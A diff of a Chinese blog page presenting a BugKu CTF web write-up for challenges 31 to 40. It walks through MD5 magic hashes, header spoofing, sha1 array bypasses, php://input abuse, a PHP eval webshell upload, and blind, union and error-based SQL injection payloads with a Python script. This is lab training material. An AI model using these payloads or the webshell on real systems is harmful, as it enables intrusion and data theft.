@@ -10,8 +10,8 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate">
     <meta name="keywords" content="TriDiamond Obsidian,"> 
-    <meta name="description" content="前一部分链接：第21-30关Write-up
-第三十一关（md5 collision(NUPT_CTF)）我打开题目是没有给任何提示的，只有链接进去提示&amp;quot;please input a&amp;qu,"> 
+    <meta name="description" content="第三十一关（md5 collision(NUPT_CTF)）我打开题目是没有给任何提示的，只有链接进去提示&amp;quot;please input a&amp;quot;，源代码也没有写任何东西
+去找别人的Wr,"> 
     <meta name="author" content="Knlvre"> 
     <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
     <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
@@ -125,8 +125,7 @@
 <div class="article">
     <div class='main'>
         <div class="content markdown animated fadeIn">
-            <p>前一部分链接：<a href="https://knlvre.github.io/knlvre.github.io/2019/03/28/BugKuCTF%E2%80%94Web%E9%A2%98%20%E7%AC%AC21-30%E5%85%B3/">第21-30关Write-up</a></p>
-<h3 id="第三十一关（md5-collision-NUPT-CTF-）"><a href="#第三十一关（md5-collision-NUPT-CTF-）" class="headerlink" title="第三十一关（md5 collision(NUPT_CTF)）"></a>第三十一关（md5 collision(NUPT_CTF)）</h3><p>我打开题目是没有给任何提示的，只有链接进去提示<code>&quot;please input a&quot;</code>，源代码也没有写任何东西</p>
+            <h3 id="第三十一关（md5-collision-NUPT-CTF-）"><a href="#第三十一关（md5-collision-NUPT-CTF-）" class="headerlink" title="第三十一关（md5 collision(NUPT_CTF)）"></a>第三十一关（md5 collision(NUPT_CTF)）</h3><p>我打开题目是没有给任何提示的，只有链接进去提示<code>&quot;please input a&quot;</code>，源代码也没有写任何东西</p>
 <p>去找别人的WriteUp，别人做题可以看到提示代码：</p>
 <pre><code class="php">&lt;?php
 $md51 = md5(&#39;QNKCDZO&#39;);
@@ -143,7 +142,7 @@ else{echo &quot;please input a&quot;;}
 </code></pre>
 <p>那就是<code>$a</code>的值不等于<code>QNKCDZO</code>，但是<code>md5</code>加密后的值却要与之相等，只要找到经过md5加密后<code>0e开头的</code>值就行 </p>
 <p>这里列举一些比较常用的：</p>
-<pre><code>加密前字符串：
+<pre><code class="Code">加密前字符串：
 md5加密后密文：
 
 s878926199a
@@ -216,19 +215,22 @@ s1665632922a
 0e731198061491163073197128363787
 s878926199a
 0e545993274517709034328855841020
-</code></pre><p>这些原值当中随意选择一个提交上去就可以了</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/1-1.png" alt="1-1"></p>
+</code></pre>
+<p>这些原值当中随意选择一个提交上去就可以了</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/1-1.png" alt></p>
 <h3 id="第三十二关（程序员本地网站）"><a href="#第三十二关（程序员本地网站）" class="headerlink" title="第三十二关（程序员本地网站）"></a>第三十二关（程序员本地网站）</h3><p>链接进去，提示<code>请从本地访问！</code>。这个时候就行到了HTTP请求头的<code>X-Forwarded-For</code>字段，给出百度的解释：</p>
-<pre><code>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段
+<pre><code class="Code">X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段
 
 X-Forwarded-For: client1, proxy1, proxy2, proxy3
 其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。 在上面这个例子中，这个请求成功通过了三台代理服务器：proxy1, proxy2 及 proxy3。请求由client1发出，到达了proxy3(proxy3可能是请求的终点)。请求刚从client1中发出时，XFF是空的，请求被发往proxy1；通过proxy1的时候，client1被添加到XFF中，之后请求被发往proxy2;通过proxy2的时候，proxy1被添加到XFF中，之后请求被发往proxy3；通过proxy3时，proxy2被添加到XFF中，之后请求的的去向不明，如果proxy3不是请求终点，请求会被继续转发。
 鉴于伪造这一字段非常容易，应该谨慎使用X-Forwarded-For字段。正常情况下XFF中最后一个IP地址是最后一个代理服务器的IP地址, 这通常是一个比较可靠的信息来源。
-</code></pre><p>简单的说，通过这个字段，我们可以伪造假的<code>请求来源IP地址</code></p>
+</code></pre>
+<p>简单的说，通过这个字段，我们可以伪造假的<code>请求来源IP地址</code></p>
 <p>题目要求从本地访问，那就是<code>127.0.0.1</code>，在HTTP请求头添加<code>X-Forwarded-For</code>字段：</p>
-<pre><code>X-Forwarded-For：127.0.0.1
-</code></pre><p>拿下flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/2-1.png" alt="2-1"></p>
+<pre><code class="Code">X-Forwarded-For：127.0.0.1
+</code></pre>
+<p>拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/2-1.png" alt></p>
 <h3 id="第三十三关（各种绕过）"><a href="#第三十三关（各种绕过）" class="headerlink" title="第三十三关（各种绕过）"></a>第三十三关（各种绕过）</h3><p>链接进去看到代码：</p>
 <pre><code class="php">&lt;?php 
 highlight_file(&#39;flag.php&#39;); 
@@ -253,11 +255,12 @@ if (isset($_GET[&#39;uname&#39;]) and isset($_POST[&#39;passwd&#39;])) {
 <p>要求：id的值经过urldecode之后等于margin，uname和passwd的值不相等，但是经过sha1()之后要想等</p>
 <p>思路：英文单词再怎么编码都是原来的单词，中文和符号就会因为编码改变。利用数组绕过sha1()</p>
 <p><code>payload</code>：</p>
-<pre><code>?id=margin&amp;uname[]=1
+<pre><code class="Code">?id=margin&amp;uname[]=1
 
 //POST passwd的值：passwd[]=2
-</code></pre><p>拿下flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/3-1.png" alt="3-1"></p>
+</code></pre>
+<p>拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/3-1.png" alt></p>
 <h3 id="第三十四关（web8）"><a href="#第三十四关（web8）" class="headerlink" title="第三十四关（web8）"></a>第三十四关（web8）</h3><p>链接进去看到代码：</p>
 <pre><code class="php">&lt;?php
 extract($_GET);
@@ -276,41 +279,44 @@ if (!empty($ac)){
 <p><code>trim()</code>函数：只传入参数没有额外写模式时，就是默认去掉空格</p>
 <p>看到<code>file_get_contents</code>，想到<code>PHP伪协议（php://input）</code>，第<code>二十四关</code>有提到</p>
 <p>题目提示<code>txt</code>，那应该就是<code>flag.txt</code>了，构造<code>payload</code>：</p>
-<pre><code>?fn=php://input&amp;ac=flag.txt
+<pre><code class="Code">?fn=php://input&amp;ac=flag.txt
 
 //请求主体中提交字符串：flag.txt
-</code></pre><p>拿下flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/4-1.png" alt="4-1"></p>
+</code></pre>
+<p>拿下flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/4-1.png" alt></p>
 <h3 id="第三十五关（细心）"><a href="#第三十五关（细心）" class="headerlink" title="第三十五关（细心）"></a>第三十五关（细心）</h3><p>链接进去只看到以下内容，两个按钮点进去也没有任何帮助</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-1.png" alt="5-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-1.png" alt></p>
 <p>但是看到其中的文字提示<code>No such file or directory</code>，应该是一个文件或者目录的查找操作</p>
 <p>用<code>御剑</code>扫描一下，发现<code>robots.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-2.png" alt="5-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-2.png" alt></p>
 <p>访问一下，看到<code>resusl.php</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-3.png" alt="5-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-3.png" alt></p>
 <p>访问一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-4.png" alt="5-4"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-4.png" alt></p>
 <p>查看源代码，没有获得有用信息。用Burpsuits加上X-Forwarded-For：127.0.0.1也没用</p>
 <p>最后想到题目提示：<code>想办法变成admin</code>，试一下把x的值设置为admin：</p>
-<pre><code>?x=admin
-</code></pre><p>没想到居然成功了，拿到了flag，感觉有点像脑洞题</p>
+<pre><code class="Code">?x=admin
+</code></pre>
+<p>没想到居然成功了，拿到了flag，感觉有点像脑洞题</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/5-5.png" alt="5-5"></p>
 <h3 id="第二十六关（求getshell）"><a href="#第二十六关（求getshell）" class="headerlink" title="第二十六关（求getshell）"></a>第二十六关（求getshell）</h3><p>链接进去看到有上传文件的按钮，并且提示：<code>My name is margin,give me a image file not a php</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/6-1.png" alt="6-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/6-1.png" alt></p>
 <p>猜测应该是文件上传漏洞，那么与<code>getshell</code>有关的应该是要<code>一句话木马</code>，先写好保存下来</p>
 <pre><code class="php">&lt;php @eval($_POST[&#39;123&#39;]) ?&gt;
 </code></pre>
 <p>提交的时候用<code>Burpsuits</code>抓取下来</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/6-2.png" alt="6-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/6-2.png" alt></p>
 <p>要求我们上传<code>image</code>，但我们却上传<code>php</code>，所以需要修改头部，以此来欺骗服务器，将我们的文件成功传入</p>
 <p>需要修改的地方有3处：<code>请求头的Content-Type</code>、<code>filename</code>、<code>请求数据的Content-Type</code></p>
-<pre><code>求头的Content-Type：将任意的字母改成大写，绕过就可以
+<pre><code class="Code">求头的Content-Type：将任意的字母改成大写，绕过就可以
 
 filename：测试过后缀黑名单后（php2, php3, php4, php5，phps, pht, phtm, phtml），发现只有php5可以绕过
 
 请求数据的Content-Type：改为image/jpeg
-</code></pre><p>修改完后，就可以成功提交上去。提交完也不用菜刀或蚁剑去连接上传的一句话木马，直接返回flag</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/6-3.png" alt="6-3"></p>
+</code></pre>
+<p>修改完后，就可以成功提交上去。提交完也不用菜刀或蚁剑去连接上传的一句话木马，直接返回flag</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/6-3.png" alt></p>
 <h3 id="第二十七关（INSERT-INTO注入）"><a href="#第二十七关（INSERT-INTO注入）" class="headerlink" title="第二十七关（INSERT INTO注入）"></a>第二十七关（INSERT INTO注入）</h3><p>题目提示：</p>
 <pre><code class="php">//不如写个Python吧
 
@@ -354,9 +360,9 @@ mysql_query($sql);
 <pre><code class="mysql">insert into client_ip (ip) values (&#39;1&#39; + (select case when (ascii(substr(database() from 1 for 1))=116) then sleep(3) else 0 end))#&#39;)
 #我们的数据库为：test，所以第一位t的ASCII码为116
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/7-1.png" alt="7-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/7-1.png" alt></p>
 <p>可以看到，我们将<code>116</code>换成<code>117</code>后，返回时间就变成了0，也就是说不符合条件，得到验证</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/7-2.png" alt="7-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/7-2.png" alt></p>
 <p>接下来就写个Python脚本：</p>
 <pre><code class="python">import requests
 
@@ -392,19 +398,19 @@ for i in range(1,50):
 print(&#39;database:&#39;,database)
 </code></pre>
 <p>最后得到flag，需要自己加上边框</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/7-3.png" alt="7-3"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/7-3.png" alt></p>
 <h3 id="第二十八关（这是一个神奇的登陆框）"><a href="#第二十八关（这是一个神奇的登陆框）" class="headerlink" title="第二十八关（这是一个神奇的登陆框）"></a>第二十八关（这是一个神奇的登陆框）</h3><p>URL提示是SQL注入</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-1.png" alt="7-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-1.png" alt></p>
 <p>刚开始对<code>用户名</code>字段注入，<code>单引号</code>、<code>两个单引号</code>都失败，使用<code>双引号</code>才出现报错信息</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-2.png" alt="8-2"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-2.png" alt></p>
 <p>好像没有被包裹，尝试一下，失败</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-3.png" alt="8-3"></p>
 <p>用<code>密码</code>字段试一下，可以出现报错信息，发现用<code>双引号</code>包裹</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-4.png" alt="8-4"></p>
 <p>加上<code>or 1=1 --+</code>直接给出提示：<code>Login_Name:AdMiNhEhE</code>、<code>You must login with correct ACCOUNT and PASSWORD!</code></p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-5.png" alt="8-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-5.png" alt></p>
 <p>直接将用户名改为它要求的哪个，然后用<code>password字段</code>直接注入，比较简单，不再赘述</p>
-<pre><code>admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2 --+ &amp;submit=GO GO GO
+<pre><code class="Code">admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2 --+ &amp;submit=GO GO GO
 #爆表名：flag1,whoami
 
 admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(column_name) from information_schema.columns where table_name=&#39;flag1&#39;),2 --+ &amp;submit=GO GO GO
@@ -412,9 +418,10 @@ admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_
 
 admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_concat(flag1) from flag1),2 --+ &amp;submit=GO GO GO
 #爆数据：ed6b28e684817d9efcaf802979e57aea
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-6.png" alt="8-6"></p>
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/8-6.png" alt></p>
 <h3 id="第二十九关（多次）"><a href="#第二十九关（多次）" class="headerlink" title="第二十九关（多次）"></a>第二十九关（多次）</h3><p>尝试过程：</p>
-<pre><code>?id=1&#39;
+<pre><code class="Code">?id=1&#39;
 #报错
 
 ?id=1&#39; #
@@ -426,68 +433,76 @@ admin_name=AdMiNhEhE&amp;admin_passwd=password&quot; union select (select group_
 #报错
 ?id=1&#39; || 1=1 %23
 #正常，过滤了or
-</code></pre><p>用正常语句来判断那个单词被过滤效率比较低，看了别人的Writeup，学习到了一种新方法</p>
+</code></pre>
+<p>用正常语句来判断那个单词被过滤效率比较低，看了别人的Writeup，学习到了一种新方法</p>
 <p><code>异或注入</code>：两个条件相同（同真或同假）即为假</p>
 <p>如下面的语句，当<code>union</code>被过滤时，也就是<code>length(&#39;union&#39;)!=0</code>为假，<code>length(&#39;union&#39;)==0</code>为真，union<code>被过滤了</code>，下面的等式等于：<code>1^0=1</code>，页面应该正常返回</p>
 <pre><code class="mysql">?id=1&#39;^(length(&#39;union&#39;)!=0)--+
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-1.png" alt="9-1"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-1.png" alt></p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-2.png" alt="9-2"></p>
 <p>按照这种方法，发现被过滤的一共有：<code>union、select、or、and</code></p>
 <p>然后发现<code>双写</code>可以直接绕过过滤</p>
 <p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-3.png" alt="9-3"></p>
 <p>爆表名：（此时要记得，<code>information</code>里面也有<code>or</code>，记得双写）</p>
-<pre><code>?id=-1&#39; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+
+<pre><code class="Code">?id=-1&#39; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+
 #flag1,hint
-</code></pre><p>爆列名：</p>
-<pre><code>?id=-1&#39; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;flag1&#39; --+
+</code></pre>
+<p>爆列名：</p>
+<pre><code class="Code">?id=-1&#39; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;flag1&#39; --+
 #flag1,address
-</code></pre><p>爆数据：</p>
-<pre><code>?id=-1&#39; uniunionon selselectect 1,group_concat(flag1) from flag1 --+
+</code></pre>
+<p>爆数据：</p>
+<pre><code class="Code">?id=-1&#39; uniunionon selselectect 1,group_concat(flag1) from flag1 --+
 #usOwycTju+FTUUzXosjr
-</code></pre><p>对爆出来的字符串没什么想法，想起来题目提示本题有<code>两个flag</code></p>
+</code></pre>
+<p>对爆出来的字符串没什么想法，想起来题目提示本题有<code>两个flag</code></p>
 <p>爆另外一列的数据：</p>
-<pre><code>?id=-1&#39; uniunionon selselectect 1,group_concat(address) from flag1 --+
-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-4.png" alt="9-4"></p>
+<pre><code class="Code">?id=-1&#39; uniunionon selselectect 1,group_concat(address) from flag1 --+
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-4.png" alt></p>
 <p>点击后进入下一关</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-5.png" alt="9-5"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-5.png" alt></p>
 <p>加上<code>单引号</code>时，弹出报错信息，可以判断是用单引号包裹的</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-6.png" alt="9-6"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-6.png" alt></p>
 <p>同理，用前面学到的异或运算，判断页面有哪几种状态</p>
-<pre><code>?id=1&#39;^1 --+
+<pre><code class="Code">?id=1&#39;^1 --+
 
 ?id=1&#39;^0 --+
-</code></pre><p>此时我们知道了，网页有两种状态：1.正确时返回<code>Hello,I Am Here!</code>，2.错误时返回<code>Nobody!</code></p>
+</code></pre>
+<p>此时我们知道了，网页有两种状态：1.正确时返回<code>Hello,I Am Here!</code>，2.错误时返回<code>Nobody!</code></p>
 <p>想要开始测试被过滤的单词，后来我们发现，服务器给我们返回我们输入的<code>id</code>值，如果字符被过滤掉，就不会回显</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-7.png" alt="9-7"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-7.png" alt></p>
 <p>我们也可以直接利用这点直接判断那些被过滤：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-8.png" alt="9-8"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-8.png" alt></p>
 <p>从上图我们可以看出<code>union</code>、<code>sleep</code>被过滤了，并且此题无法用<code>大小写</code>、<code>双写</code>来绕过，但是<code>报错注入</code>没有被过滤</p>
 <p>爆表名：</p>
-<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
+<pre><code class="Code">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+
 #class,flag2
-</code></pre><p>爆列名：</p>
-<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag2&#39;)))--+
+</code></pre>
+<p>爆列名：</p>
+<pre><code class="Code">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;flag2&#39;)))--+
 #flag2,address
-</code></pre><p>爆数据：</p>
-<pre><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+
+</code></pre>
+<p>爆数据：</p>
+<pre><code class="Code">?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+
 #flag{Bugku-sql_6s-2i-4t-bug}，但这个不是flag，骗人
 
 ?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(address) from flag2),0x7e))--+
 ./Have_Fun.php
-</code></pre><p>和第一步一样，有一个地址，访问一下一片空白，用<code>Burpsuits</code>看一下</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-9.png" alt="9-9"></p>
+</code></pre>
+<p>和第一步一样，有一个地址，访问一下一片空白，用<code>Burpsuits</code>看一下</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-9.png" alt></p>
 <p>添加<code>X-Forwarded-For</code>字段，发现返回图片</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-10.png" alt="9-10"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-10.png" alt></p>
 <p>用浏览器看一下发现是一张<code>二维码</code>，用手机扫描：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-11.png" alt="9-11"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-11.png" alt></p>
 <p>进入这个页面后，开始失去了方向，参数game传入也没有用，最后回到题目提示：</p>
-<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-12.png" alt="9-12"></p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/knlvre.github.io/master/img/BugkuCTFWeb/31-40/9-12.png" alt></p>
 <p><code>flag只有2个</code>，那我们爆出来的flag2就是答案才对</p>
 <p>再看第二句，<code>flag是小写</code>，把flag的B改成小写b：<code>flag{bugku-sql_6s-2i-4t-bug}</code></p>
 <p>提交一下，成功了。。。。。</p>
 <p>所以第三步是骗人的，要回到题目提示，不然会被自己带进去绕不出来</p>
-<hr>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls"
